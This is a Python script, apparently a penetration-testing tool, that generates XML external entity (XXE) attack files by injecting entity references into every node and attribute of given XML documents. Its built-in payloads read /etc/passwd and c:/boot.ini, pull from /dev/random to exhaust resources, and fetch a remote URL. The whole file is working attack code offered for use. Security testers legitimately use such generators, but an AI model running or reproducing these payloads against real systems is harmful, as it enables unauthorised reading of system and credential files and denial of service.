# -*- coding: utf-8 -*-
__author__ = 'Max'

from lxml import etree
from optparse import OptionParser
from xml.sax.saxutils import unescape
import os.path

BUILTIN_ENTITIES = ['file:///dev/random',
                    'file:///etc/passwd',
                    'file:///c:/boot.ini',
                    'http://codepad.org/kfHNgnZj/raw.c']
ENTITY_PREFIX = 'a'
ENTITY_TEMPLATE = '<!ENTITY %s SYSTEM "%s">'
ELEMENT_TEMPLATE = '<!ELEMENT %s ANY>'
ATTLIST_TEMPLATE = '<!ATTLIST %s %s CDATA #REQUIRED>'
ENTITY_PAYLOAD_TEMPLATE = '&%s;'  # ENTITY_PREFIX + number
DOCTYPE_TEMPLATE = '<!DOCTYPE %s [ %s\n%s ]>'  # root_node_tag, dtd, entities


def parse_options():
    """Parse command line arguments."""

    opt_parser = OptionParser()
    opt_parser.add_option('-f', '--file', '--files', dest='files',
                          help='Path to an XML file. Multiple files supported'
                               '(each with its own option prefix)', action='append')
    opt_parser.add_option('-e', '--entity', '--entities', dest='entities', action='append',
                          help='Custom entity body(optional). '
                               'Multiple entities supported(each with its own option prefix)')
    opt_parser.add_option('-n', '--file-per-node', dest='file_per_node',
                          help='Use this flag to make XML-bombs with all the nodes and '
                               'attributes of all the given files filled with payload '
                               'for all the entities(built-in + provided)',
                          action='store_true', default=False)
    opt_parser.add_option('-d', '--dtd', dest='dtd', action='store_true', default=False,
                          help='Use this flag to turn on DTD generation.')

    return opt_parser.parse_args()


def validate_options(options):
    """Validate given options and consider them."""

    if options.files is None:
        raise Exception("No XML files provided. Run the script with '-h' for help")

    existing_files = [filename for filename in options.files if os.path.exists(filename) and os.path.isfile(filename)]

    if len(existing_files) <= 0:
        raise Exception("No XML files provided. Run the script with '-h' for help.\n\t\t"
                        "Probably, none of given files is present.")

    used_entities = set()

    if options.entities is not None:
        if options.file_per_node:
            used_entities.add(options.entities[0])
        else:
            used_entities.update(BUILTIN_ENTITIES)
            used_entities.update(options.entities)
    else:
        if options.file_per_node:
            used_entities.add(BUILTIN_ENTITIES[0])
        else:
            used_entities.update(BUILTIN_ENTITIES)

    #  Turn a set of entities to a list and return it
    return existing_files, list(used_entities)


def build_dtd(tree):
    """Returns a DTD description of a given tree in a form of a string."""

    dtd_elements = set()

    for elem in tree.iter():
        dtd_elements.add(ELEMENT_TEMPLATE % elem.tag)

        for attr_name in elem.attrib.keys():
            dtd_elements.add(ATTLIST_TEMPLATE % (elem.tag, attr_name))

    return '\n\t'.join(dtd_elements)


def build_trees_and_dtds(files, options):
    """Returns a list of pairs of the following structure: (tree, dtd_of_the_tree)."""
    return [(lambda a: (a, build_dtd(a) if options.dtd else ''))(etree.parse(filename)) for filename in files]


def build_entity(name, value):
    """Returns a single formed entity in a form of a string."""
    return ENTITY_TEMPLATE % (name, value)


def build_entities(values):
    """Returns a list of entities in a form of a string."""
    return '\n\t'.join([build_entity(ENTITY_PREFIX + str(i), value) for i, value in enumerate(values)])


def build_entity_payload(count):
    """Returns payload, consisted of 'count' number of entities.
    Formed from ENTITY_PAYLOAD_TEMPLATE."""
    return ''.join([ENTITY_PAYLOAD_TEMPLATE % (ENTITY_PREFIX + str(i)) for i in range(0, count)])


def build_doctype(root_tag, dtd, entities):
    """Returns a formed DOCTYPE element; made on the basis of
    DOCTYPE_TEMPLATE and consists of the name of the document
    root tag, DTD of the given XML and given entities
    description(string)."""
    return DOCTYPE_TEMPLATE % (root_tag, dtd, '\t' + entities)


def save_output_file(filename, tree, doctype):
    result = unescape(
        etree.tostring(tree, xml_declaration=True,
                       encoding=tree.docinfo.encoding,
                       doctype=doctype,
                       pretty_print=True).decode(tree.docinfo.encoding))
    print('Working on file: %s' % tree.getroot().base)
    open(filename, 'w').write(result)


def build_bomb_payload_per_node(entities):
    """Builds XML-bombs; each bomb is about to contain entity
    in a single node or attribute."""

    total_files = 0  # number of generated files
    p = 0  # payloads counter

    for entity in entities:
        for tree, dtd in trees:
            doctype = build_doctype(tree.getroot().tag, dtd, build_entities([entity]))
            filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]

            i = 0  # insertions counter

            for elem in tree.iter():
                for attr_name in elem.attrib.keys():
                    buf = elem.attrib[attr_name]
                    elem.attrib[attr_name] = build_entity_payload(1)

                    final_filename = '%s_%d_%d.xml' % (filename_prefix, p, i)
                    save_output_file(final_filename, tree, doctype)

                    elem.attrib[attr_name] = buf
                    i += 1

                buf = elem.text
                elem.text = build_entity_payload(1)

                final_filename = '%s_%d_%d.xml' % (filename_prefix, p, i)
                save_output_file(final_filename, tree, doctype)

                elem.text = buf
                i += 1

            total_files += i

        p += 1

    print('Total number of generated files: %d' % total_files)


def build_bomb_put_payload_everywhere(entities):
    """Builds a single XML-bomb, which contains all the
    entities as a payload in every single attribute and node."""

    payload = build_entity_payload(len(entities))
    entities = build_entities(entities)

    for tree, dtd in trees:
        doctype = build_doctype(tree.getroot().tag, dtd, entities)
        filename_prefix = os.path.basename(tree.getroot().base).split('.')[0]

        i = 0  # insertions counter

        for elem in tree.iter():
            for attr_name in elem.attrib.keys():
                elem.attrib[
                    attr_name] = payload
                i += 1

            elem.text = payload
            i += 1

        final_filename = '%s_%d.xml' % (filename_prefix, i)
        save_output_file(final_filename, tree, doctype)

        print('Total number of insertions: %d; files generated: 1' % i)


if __name__ == '__main__':
    try:
        given_options = parse_options()[0]
        attacked_files, entities_for_payload = validate_options(given_options)
        trees = build_trees_and_dtds(attacked_files, given_options)

        if given_options.file_per_node:
            build_bomb_payload_per_node(entities_for_payload)
        else:
            build_bomb_put_payload_everywhere(entities_for_payload)
    except Exception as e:
        print('An exception occurred during the execution:')

        for arg in e.args:
            print('\t>>', arg)